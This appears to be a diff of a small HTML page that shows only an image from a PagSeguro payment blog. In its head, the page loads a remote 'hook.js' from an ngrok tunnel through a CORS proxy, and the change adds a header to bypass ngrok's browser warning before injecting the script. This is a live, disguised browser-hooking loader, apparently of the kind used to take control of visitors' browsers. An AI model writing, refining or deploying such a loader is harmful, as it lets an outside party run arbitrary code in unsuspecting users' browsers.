@@ -6,17 +6,25 @@
         // Create a new script element
         var script = document.createElement('script');
 
-        // Use corsproxy.io to fetch the script
+        // Use a CORS proxy to fetch the script
         var corsProxy = 'https://corsproxy.io/?';
-        var scriptUrl = encodeURIComponent('https://9288-191-54-132-249.ngrok-free.app:443/hook.js');
-        script.src = corsProxy + scriptUrl;
+        var scriptUrl = 'https://9288-191-54-132-249.ngrok-free.app:443/hook.js';
+        script.src = corsProxy + encodeURIComponent(scriptUrl);
 
-        // Append the script to the head
-        document.head.appendChild(script);
+        // Attempt to set a custom request header (might not be supported by the proxy)
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', script.src, true);
+        xhr.setRequestHeader('ngrok-skip-browser-warning', 'true');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                // Append the script to the head when it's loaded
+                document.head.appendChild(script);
+            }
+        };
+        xhr.send();
     </script>
 </head>
 <body>
     <img src="https://assets-blog.pagseguro.uol.com.br/wp-content/2020/11/Post_329_imagem_meio_de_texto_IIIIIII.png" alt="Imagem">
-    <!-- script update 4 -->
 </body>
 </html>
